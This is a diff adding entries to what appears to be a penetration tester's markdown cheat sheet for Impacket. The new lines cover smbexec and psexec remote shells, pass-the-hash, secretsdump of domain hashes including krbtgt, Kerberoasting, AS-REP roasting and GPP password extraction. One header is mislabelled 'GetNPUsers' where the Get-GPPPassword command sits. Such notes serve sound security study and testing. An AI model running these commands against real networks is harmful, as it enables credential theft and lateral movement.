@@ -72,8 +72,10 @@ $ impacket-xxx DC01.example.com -no-pass -k
 Connect to a MSSQL database.
 
 ```shell!
-$ impacket-mssqlclient username@IP -windows-auth
+$ impacket-mssqlclient username@IP
+$ impacket-mssqlclient username:password@IP
 $ impacket-mssqlclient username:password@IP -windows-auth
+$ impacket-smbclient -no-pass domain\username@IP -hashes lmhash:nthash
 SQL> exit
 ```
 
@@ -100,6 +102,14 @@ $ impacket-wmiexec -shell-type powershell username:password@IP
 $ impacket-wmiexec -shell-type powershell username:password@IP "hostname"
 ```
 
+#### smbexec
+
+XXX.
+
+```shell!
+$ impacket-smbexec username:password@IP
+```
+
 #### psexec
 
 Pop a semi-interactive remote shell using RemComSvc. It runs commands as SYSTEM to it's quite suspicious and making noise.
@@ -109,6 +119,7 @@ $ impacket-psexec username:password@IP
 $ impacket-psexec [...] -hashes lmhash:nthash
 $ impacket-psexec [...] -hashes :nthash
 $ impacket-psexec [...] -target-ip 172.16.5.5
+$ impacket-psexec [...] -k -no-pass
 ```
 </div></div>
 
@@ -125,8 +136,9 @@ $ impacket-psexec [...] -target-ip 172.16.5.5
 Run a [SMB](../smb.md) server to which user will connect with the username XXX and the password YYY. Files will be stored in `/path/to/share`.
 
 ```shell!
-$ impacket-smbserver -smb2support share_name /path/to/share
-$ impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
+$ # impacket-smbserver -smb2support share_name /path/to/share
+$ impacket-smbserver -smb2support share .
+$ # impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
 $ impacket-smbserver -smb2support -username username -password password share .
 ```
 </div><div>
@@ -148,6 +160,7 @@ Dump hashes from a backup of SAM and SYSTEM hashes. There are local credentials 
 $ impacket-secretsdump -sam XXX -system YYY LOCAL
 $ impacket-secretsdump -sam XXX -security XXX -system XXX LOCAL
 $ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL
+$ impacket-secretsdump [...] -outputfile cracked 
 <output format is explained in the output>
 ```
 
@@ -156,10 +169,53 @@ You can remotely dump hashes using:
 ```shell!
 $ impacket-secretsdump domain/username:password@target
 $ impacket-secretsdump [...] -just-dc # ???
+$ impacket-secretsdump [...] -just-dc-user krbtgt
 $ impacket-secretsdump [...] -just-dc-user 'example.com/username'
 $ impacket-secretsdump [...] -outputfile hashes
+$ impacket-secretsdump [...] -hashes lmhash:nthash
+$ impacket-secretsdump [...] -dc-ip IP
+```
+
+#### ticketConverter
+
+Convert tickets.
+
+```shell!
+$ impacket-ticketConverter xxx yyy.kirbi # from ccache to kirbi
+$ impacket-ticketConverter xxxx.bin xxx.kirbi # same
+$ impacket-ticketConverter xxx.kirbi xxx.ccache # from kirbi to ccache
 ```
 </div><div>
+
+#### GetUserSPNs
+
+Refer to Kerberoasting.
+
+```shell!
+$ impacket-GetUserSPNs EXAMPLE.COM/username -k -no-pass
+$ impacket-GetUserSPNs EXAMPLE.COM/username@EXAMPLE.COM -k -no-pass
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password # list all
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request # get TGS for all
+$ impacket-GetUserSPNs -dc-ip IP domain/user:password -request-user cn -outputfile cn_tgs # get TGS for 'cn'
+$ impacket-GetUserSPNs [...] -target-domain dev.example.com
+```
+
+#### GetNPUsers
+
+Refer to asreproasting.
+
+```shell!
+$ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
+```
+
+#### GetNPUsers
+
+Refer to GPO Passwords.
+
+```shell!
+$ impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL
+```
+
 </div></div>
 
 <hr class="sep-both">
